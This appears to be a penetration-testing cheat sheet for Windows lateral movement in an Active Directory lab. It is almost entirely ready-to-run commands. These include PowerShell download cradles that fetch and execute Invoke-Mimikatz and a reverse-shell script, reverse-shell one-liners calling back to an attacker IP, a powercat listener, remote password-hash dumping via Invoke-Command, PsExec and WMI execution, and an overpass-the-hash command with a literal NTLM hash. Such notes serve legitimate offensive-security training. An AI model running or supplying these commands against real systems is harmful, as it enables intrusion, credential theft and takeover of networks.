# Lateral Movement
> Movement Technique and Remote code execution

# table of content
1. [test](#test)


## Powershell Remoting
Change user

```powershell
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("user", $passwd)
Enter-PSSession -Credential $creds -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
If you want to save the session
```powershell
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("user", $passwd)
$sess = New-PSSession -Credential $creds
Enter-PSSession -Credential $creds -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
If you dont need a password
```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
```
Dont need password with saved session
```powershell
$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Enter-PSSession -Session $sess
```

Execution Cradle
```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
iex (iwr http://172.16.100.134/Invoke-Mimikatz.
ps1 -UseBasicParsing)
```

### Invoke Command

Use below to execute commands or scriptblocks:
```powershell
Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
 ```
Use below to execute scripts from files (some script thet wont work can work in this mode)
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
Use below to execute locally loaded function on the remote machines:
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```
In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```
In below, a function call within the script is used:
```powershell
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
Use below to execute "Stateful" commands using Invoke-Command:
```powershell
$Sess = New-PSSession –Computername Server1
Invoke-Command –Session $Sess –ScriptBlock {$Proc = GetProcess}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
```
## Technique (user hunting)
```powershell
Find-LocalAdminAccess -Verbose
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## RCE
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1')); Power -Reverse -IPAddress 172.16.100.X -Port 443


powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Power -Reverse -IPAddress 172.16.100.X -Port 443
```
powercat
```powershell
. .\powercat.ps1
powercat -l -v -p 443 -t 100
```
python open file
```bash
python -m SimpleHTTPServer 8080
python3 -m http.server
```

## WMI command
check access
```powershell
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
command execute
```cmd
.\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
```


## Over Pass The Hash
PTH with mimikatz --> perform activities as the hash but Windows still think I am the same person
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```